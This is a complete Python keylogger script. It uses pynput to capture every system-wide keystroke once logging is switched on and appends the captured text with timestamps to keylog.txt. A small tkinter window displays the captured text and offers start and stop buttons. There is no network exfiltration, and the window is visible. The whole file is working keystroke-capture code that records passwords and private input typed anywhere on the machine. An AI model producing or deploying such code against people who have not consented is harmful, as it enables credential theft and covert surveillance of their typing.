import os
import threading
import time
from datetime import datetime
from pynput import keyboard
import tkinter as tk
from tkinter import scrolledtext

# Global variables
keystroke_buffer = []
log_file = "keylog.txt"
logging_active = False  # Control flag for logging
last_key = None  # To prevent duplicate key presses

# Function to write logs to a file
def write_to_file(log):
    with open(log_file, "a") as f:
        f.write(log + "\n")

# Function to handle key presses
def on_press(key):
    global last_key
    if not logging_active:
        return  # Stop logging if logging is inactive

    try:
        if key == last_key:  
            return  # Ignore duplicate key presses
        last_key = key  

        if hasattr(key, "char") and key.char is not None:
            keystroke_buffer.append(key.char)
        else:
            special_keys = {
                keyboard.Key.space: " ",
                keyboard.Key.enter: "\n",
                keyboard.Key.tab: "[TAB]"
            }
            if key == keyboard.Key.backspace and keystroke_buffer:
                keystroke_buffer.pop()  # Remove last typed character
            else:
                keystroke_buffer.append(special_keys.get(key, ""))  # Ignore other special keys

        if len(keystroke_buffer) >= 10:
            send_keystrokes()
    except AttributeError:
        pass

# Function to send and store keystrokes
def send_keystrokes():
    if keystroke_buffer:
        log = "".join(keystroke_buffer)
        timestamp = datetime.now().strftime("[%Y-%m-%d %H:%M:%S] ")
        write_to_file(timestamp + log)
        update_gui_log(timestamp + log)  # Update GUI log display
        keystroke_buffer.clear()

# Function to start logging
def start_logging():
    global logging_active
    logging_active = True
    log_area.insert(tk.END, "🔴 Keylogging started...\n")
    log_area.yview(tk.END)

# Function to stop logging
def stop_logging():
    global logging_active
    logging_active = False
    log_area.insert(tk.END, "🟢 Keylogging stopped.\n")
    log_area.yview(tk.END)

# Function to update GUI log display
def update_gui_log(log):
    log_area.insert(tk.END, log + "\n")
    log_area.yview(tk.END)

# Function to run keylogger in background
def run_keylogger():
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

# GUI Setup
root = tk.Tk()
root.title("Keylogger")
root.geometry("500x400")
root.resizable(False, False)

log_area = scrolledtext.ScrolledText(root, wrap=tk.WORD, width=60, height=15)
log_area.pack(pady=10)

start_button = tk.Button(root, text="Start Logging", command=start_logging, bg="green", fg="white", width=15)
start_button.pack(side=tk.LEFT, padx=20, pady=10)

stop_button = tk.Button(root, text="Stop Logging", command=stop_logging, bg="red", fg="white", width=15)
stop_button.pack(side=tk.RIGHT, padx=20, pady=10)

# Run keylogger in a separate thread
keylogger_thread = threading.Thread(target=run_keylogger, daemon=True)
keylogger_thread.start()

# Run the GUI
root.mainloop()
